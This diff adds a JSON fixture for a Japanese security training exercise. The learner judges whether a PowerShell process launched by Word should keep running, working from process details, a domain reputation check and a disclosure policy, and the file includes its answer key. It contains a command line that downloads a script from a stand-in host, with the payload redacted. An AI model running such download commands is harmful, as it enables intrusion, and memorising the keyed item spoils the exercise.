@@ -1,0 +1,109 @@
+{
+  "schema_version": 1,
+  "id": "PROC-WIN-OFFICE-DOWNLOAD",
+  "category": "process",
+  "platform": "windows",
+  "level": "beginner",
+  "ground_truth": "block",
+  "title": "Officeからの外部取得Command",
+  "request": "稼働中のProcessを継続させますか。 ALLOW / BLOCKで判断してください。",
+  "initial_information": {
+    "Process": "powershell.exe",
+    "PID": 4200,
+    "User": "ASTER\\mori",
+    "採取時点": "2026-08-18 09:10 / 起動済み"
+  },
+  "initial_information_types": {
+    "PID": "pid",
+    "User": "username"
+  },
+  "tools": [
+    {
+      "id": "pe",
+      "name": "Process Explorer",
+      "description": "実行Path・Command Line・親Process・ロード済みDLLを確認します。",
+      "output": "Parent: WINWORD.EXE (3010)\nPID: 4200\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoProfile -Command \"iwr https://office-assets.example/a.ps1; <TRAINING-PLACEHOLDER:取得Scriptの実行>\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Windows / Microsoft Sysinternals・要導入",
+      "environments": [
+        "windows"
+      ],
+      "output_information": [
+        {
+          "id": "image",
+          "label": "Backing Executable",
+          "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "data_type": "file"
+        },
+        {
+          "id": "domain",
+          "label": "Command内URLのHost",
+          "value": "office-assets.example",
+          "data_type": "domain"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "id": "disclosure",
+      "name": "外部照会方針",
+      "content": {
+        "公開Indicator": "公開Domain・公開IP・公開配布FileのSHA-256は照会可。",
+        "File本体": "社外秘Fileは送信不可。公開配布物は送信可。",
+        "URL": "Token・User ID・内部Host・機密Pathを含む完全URLは送信不可。",
+        "Email・PCAP": "本文、添付、認証情報を含むため本教材の案件では外部送信不可。",
+        "今回の資料区分": "公開Indicatorの照会対象。個別の機密情報は上記に従う。"
+      }
+    }
+  ],
+  "external_references": [
+    {
+      "id": "domain_rep",
+      "name": "Domain Reputation",
+      "description": "外部サービスへ対象を送信し、保存済みの照会結果を表示します。",
+      "output": "Domain: office-assets.example\n2026-08-18: malware-distribution 11/14 feeds",
+      "accepted_information_types": [
+        "domain"
+      ],
+      "input_bindings": [
+        {
+          "source": "pe",
+          "id": "domain"
+        }
+      ],
+      "input_hint": "domain",
+      "submission_type": "domain",
+      "submission_value": "office-assets.example",
+      "confidentiality_warning": "Domain名のみを送信します。URLのPath・Queryは送りません。",
+      "correct_usage": true,
+      "reason": "外部照会方針でこのIndicatorの送信が許可されています。"
+    }
+  ],
+  "required_evidence": [
+    "pe",
+    "domain_rep",
+    "disclosure"
+  ],
+  "explanation": "Wordが起動したPowerShellに外部取得・実行の引数があり、取得先Domainも既知の配布先として検出されているため停止します。PowerShellの存在そのものを根拠にはしません。",
+  "topic": "親Process・Command LineとDomain評判を組み合わせる",
+  "summary": "親Process・Command LineとDomain評判を組み合わせる",
+  "learning_objectives": [
+    "親Process・Command LineとDomain評判を組み合わせる"
+  ],
+  "decision_context": "running_process",
+  "scenario_type": "standard",
+  "sources": [
+    "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer"
+  ],
+  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。"
+}
